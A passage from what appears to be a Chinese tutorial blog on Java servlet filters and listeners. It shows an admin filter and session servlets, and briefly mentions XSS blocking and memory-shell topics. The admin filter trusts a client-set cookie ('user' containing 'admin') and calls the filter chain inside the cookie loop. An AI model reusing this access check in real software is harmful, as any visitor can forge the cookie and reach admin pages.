</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;欢迎进入管理员页面&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li>在filter下创建AdminFileter</li>
<li>先不加入判断获取到浏览器本身的cookie值</li>
</ul>
<div class="code-block-container" id="code-1769750397297910900" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397297910900">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397297910900" title="Toggle" aria-expanded="false" aria-controls="code-1769750397297910900" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397297910900-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@WebFilter</span><span class="p">(</span><span class="s">&#34;/admin&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">AdminFileter</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Filter</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 过滤器初始化方法，在应用启动时执行</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">FilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;admin身份检测开启&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 过滤器销毁方法，在应用关闭时执行</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;admin身份检测销毁&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 过滤器核心逻辑，处理请求和响应</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">filterChain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;admin身份检测进行&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 检测Cookie过滤</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Cookie</span><span class="o">[]</span><span class="w"> </span><span class="n">cookies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getCookies</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 对Cookie进行遍历获取</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Cookie</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">cookies</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span><span class="w">    </span><span class="c1">// 获取cookie名</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getValue</span><span class="p">();</span><span class="w">  </span><span class="c1">// 获取cookie值</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">cName</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">cValue</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li>检查请求中是否包含<strong>名为 “user” 且值为 “admin”</strong> 的Cookie。如果符合条件，则放行请求；否则，输出 “非管理员访问”。</li>
<li>相应进入管理员页面，必须先在浏览器中添加对应判断的cookie值</li>
<li>如果对应不上则是非管理员访问，不予通过</li>
</ul>
<div class="code-block-container" id="code-1769750397303423600" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397303423600">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397303423600" title="Toggle" aria-expanded="false" aria-controls="code-1769750397303423600" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397303423600-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 过滤器核心逻辑，处理请求和响应</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">filterChain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;admin身份检测进行&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 检测Cookie过滤</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Cookie</span><span class="o">[]</span><span class="w"> </span><span class="n">cookies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getCookies</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 对Cookie进行遍历获取</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Cookie</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">cookies</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span><span class="w">    </span><span class="c1">// 获取cookie名</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getValue</span><span class="p">();</span><span class="w">  </span><span class="c1">// 获取cookie值</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">cName</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">cValue</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 检查是否包含名为 &#34;user&#34; 且值为 &#34;admin&#34; 的Cookie</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cName</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;user&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">cValue</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;admin&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">// 是管理员，放行请求</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                    </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;非管理员访问&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">// 非管理员，可以根据需求添加相应的处理逻辑，例如重定向到登录页等</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="6过滤器安全场景">6、过滤器安全场景<a hidden class="anchor" aria-hidden="true" href="#6过滤器安全场景">#</a></h4>
<p>开启过滤后，发现成功拦截Xss攻击</p>
<p>Payload检测，权限访问控制，红队内存马植入，蓝队清理内存马等</p>
<h2 id="监听器-listen">监听器-Listen<a hidden class="anchor" aria-hidden="true" href="#监听器-listen">#</a></h2>
<p>参考：<a href="https://blog.csdn.net/qq_52797170/article/details/124023760">https://blog.csdn.net/qq_52797170/article/details/124023760</a></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859569.png" style="max-width: 100%; height: auto;"></p>
<p>监听ServletContext、HttpSession、ServletRequest等域对象创建和销毁事件<br>
监听域对象的属性发生修改的事件<br>
监听在事件发生前、发生后做一些必要的处理</p>
<h3 id="1创建监听器">1、创建监听器<a hidden class="anchor" aria-hidden="true" href="#1创建监听器">#</a></h3>
<p>创建新的项目ListenDemo1</p>
<p>在对应的包名上，创建分类包listenerr与servlet</p>
<p>在servlet下创建CSession DSession，并进行检测</p>
<p>DSession一个简单的Servlet，对应一个/ds的URL映射。在收到GET请求时，它会销毁当前请求的HttpSession。</p>
<div class="code-block-container" id="code-1769750397313785000" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397313785000">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397313785000" title="Toggle" aria-expanded="false" aria-controls="code-1769750397313785000" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397313785000-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@WebServlet</span><span class="p">(</span><span class="s">&#34;/ds&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">DSession</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">HttpServlet</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Servlet里面销毁Session&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 销毁Session</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">req</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">invalidate</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>@WebServlet(&quot;/ds&quot;): 通过此注解，指定了Servlet的URL映射为 “/ds”。<br>
System.out.println(&ldquo;Servlet里面销毁Session&rdquo;);: 打印一条日志，说明Servlet正在销毁Session。<br>
req.getSession().invalidate();: 获取当前请求的HttpSession，并调用invalidate()方法使其失效，从而销毁Session。这通常会导致用户在当前会话中的状态丢失，因为Session被销毁了。<br>
这段代码是一个简单的Servlet，对应一个 /cs 的URL映射。在收到GET请求时，它会创建一个新的HttpSession。</p>
<div class="code-block-container" id="code-1769750397315659000" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397315659000">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397315659000" title="Toggle" aria-expanded="false" aria-controls="code-1769750397315659000" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397315659000-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@WebServlet</span><span class="p">(</span><span class="s">&#34;/cs&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CSession</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">HttpServlet</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Servlet里面创建Session&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建Session</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">req</span><span class="p">.</span><span class="na">getSession</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>@WebServlet(&quot;/cs&quot;): 通过此注解，指定了Servlet的URL映射为 “/cs”<br>
System.out.println(&ldquo;Servlet里面创建Session&rdquo;);: 打印一条日志，说明Servlet正在创建Session。<br>
req.getSession();: 获取当前请求的HttpSession，如果不存在**则会创建一个新的Session。**这通常会在应用程序需要使用会话状态时调用。</p>
<h3 id="2监听器内置方法">2、监听器内置方法<a hidden class="anchor" aria-hidden="true" href="#2监听器内置方法">#</a></h3>
<p>这段代码定义了一个实现 HttpSessionListener 接口的监听器类 ListenSession，用于监听HttpSession的创建和销毁事件。</p>
